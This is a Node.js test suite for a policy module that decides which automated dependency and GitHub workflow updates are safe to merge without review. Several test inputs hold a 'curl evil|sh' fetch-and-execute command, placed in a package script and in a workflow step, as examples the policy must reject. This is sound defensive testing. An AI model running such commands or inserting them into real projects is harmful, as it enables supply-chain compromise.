'use strict';
const {test}=require('node:test');
const assert=require('node:assert/strict');
const {safeVersion,manifestSafe,actionPatchSafe,acceptableChecks,sameRepository}=require('./policy.cjs');
test('rejects major, prerelease, zero-major minor, downgrade and executable dependency specifications',()=>{
 for(const [a,b] of [['1.2.3','2.0.0'],['1.2.3','1.2.4-rc.1'],['0.2.1','0.3.0'],['1.4.2','1.3.9'],['1.2.3','git+https://example.com/x'],['1.2.3','npm:other@1.2.4']])assert.equal(safeVersion(a,b),false);
 assert.equal(safeVersion('^1.2.3','^1.3.0'),true);
});
test('mixed dependency update with a script, new dependency or major is never automatic',()=>{
 const a={dependencies:{a:'1.2.3',b:'3.4.5'},scripts:{test:'node test.js'}};
 assert.equal(manifestSafe(JSON.stringify(a),JSON.stringify({...a,dependencies:{a:'1.2.4',b:'3.5.0'}})),true);
 for(const b of [{...a,scripts:{test:'curl evil|sh'}},{...a,dependencies:{a:'1.2.4',b:'4.0.0'}},{...a,dependencies:{...a.dependencies,c:'1.0.0'}}])assert.equal(manifestSafe(JSON.stringify(a),JSON.stringify(b)),false);
});
test('workflow updates may change reviewed SHA references only',()=>{
 const a='a'.repeat(40),b='b'.repeat(40);
 assert.equal(actionPatchSafe(`- uses: actions/checkout@${a} # v7\n+ uses: actions/checkout@${b} # v7`),true);
 assert.equal(actionPatchSafe(`- uses: actions/checkout@${a}\n+ uses: evil/checkout@${b}`),false);
 assert.equal(actionPatchSafe('- run: npm test\n+ run: curl evil|sh'),false);
 assert.equal(actionPatchSafe('- uses: actions/checkout@v7\n+ uses: actions/checkout@v8'),false);
});
test('requires real successful checks from expected app and rejects stale, missing and failed checks',()=>{
 const check={id:1,name:'quality',status:'completed',conclusion:'success',app:{slug:'github-actions'}};
 assert.equal(acceptableChecks([check],[],['quality']),true);
 assert.equal(acceptableChecks([],[],['quality']),false);
 assert.equal(acceptableChecks([check],[],[]),false);
 assert.equal(acceptableChecks([{...check,app:{slug:'other'}}],[],['quality']),false);
 for(const c of ['skipped','cancelled','failure','neutral'])assert.equal(acceptableChecks([{...check,conclusion:c}],[],['quality']),false);
 assert.equal(acceptableChecks([check,{...check,id:2,conclusion:'failure'}],[],['quality']),false);
 assert.equal(acceptableChecks([check],[{state:'pending'}],['quality']),false);
});
test('forked contributions never inherit maintenance write permissions',()=>{
 assert.equal(sameRepository({base:{repo:{full_name:'sawetco/a'}},head:{repo:{full_name:'attacker/a'}}},'sawetco/a'),false);
});

test('nested override updates preserve package names and all executable metadata',()=>{
 const before={overrides:{parent:{child:'1.2.3'}},scripts:{postinstall:'node reviewed.js'}};
 assert.equal(manifestSafe(JSON.stringify(before),JSON.stringify({...before,overrides:{parent:{child:'1.3.0'}}})),true);
 assert.equal(manifestSafe(JSON.stringify(before),JSON.stringify({...before,overrides:{parent:{child:'2.0.0'}}})),false);
 assert.equal(manifestSafe(JSON.stringify(before),JSON.stringify({...before,scripts:{postinstall:'node unexpected.js'}})),false);
});
